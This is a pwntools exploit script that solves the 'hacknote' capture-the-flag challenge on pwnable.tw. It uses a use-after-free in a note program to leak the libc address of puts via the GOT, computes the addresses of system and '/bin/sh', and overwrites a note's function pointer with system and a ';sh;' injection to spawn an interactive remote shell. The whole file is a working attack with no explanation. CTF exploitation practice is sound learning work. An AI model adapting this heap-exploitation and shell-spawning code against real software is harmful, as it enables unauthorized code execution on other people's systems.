from pwn import *
e = ELF('./libc_32.so.6')
debug = 0
if debug:
	s = process('./hacknote')
	raw_input()
	puts_offset = 0x5fca0
	system_offset = 0x3ada0
	binsh_offset =0x15ba0b
else:
	s = remote('chall.pwnable.tw', 10102)
	puts_offset = e.symbols['puts']
	system_offset = e.symbols['system']
	binsh_offset = e.search('/bin/sh').next()

#0x080489EF : main
index = 0
def addnote(size,content):
	#0x08048646
	global index
	s.sendlineafter('Your choice :','1')
	s.sendlineafter('Note size :',str(size))
	s.sendlineafter('Content :',content)
	log.info('add note %d'%index)
	index += 1

def printnote(index):
	#0x080488A5
	s.sendlineafter('Your choice :','3')
	s.sendlineafter('Index :',str(index))
	log.info('print note %d'%index)

def deletenote(index):
	#0x080487D4
	s.sendlineafter('Your choice :','2')
	s.sendlineafter('Index :',str(index))
	log.info('delete note %d'%index)


put_func = 0x804862b
puts_got = 0x804a024
# use after free
#leak libc
addnote(20,'tuan0')
addnote(20,'tuan1')
deletenote(0)
deletenote(1)
addnote(8,p32(put_func)+p32(puts_got))
printnote(0)

puts_libc = u32(s.recv(4))
libc_base = puts_libc - puts_offset
log.info('puts_libc: 0x%x'%puts_libc)
log.info('libc_base: 0x%x'%libc_base)

#call shell
system_libc = libc_base+system_offset
binsh_libc = libc_base+binsh_offset
log.info('system_libc: 0x%x'%system_libc)
log.info('binsh_libc: 0x%x'%binsh_libc)

deletenote(2)
addnote(8,p32(system_libc)+b';sh;')
printnote(0)
s.interactive()
s.close()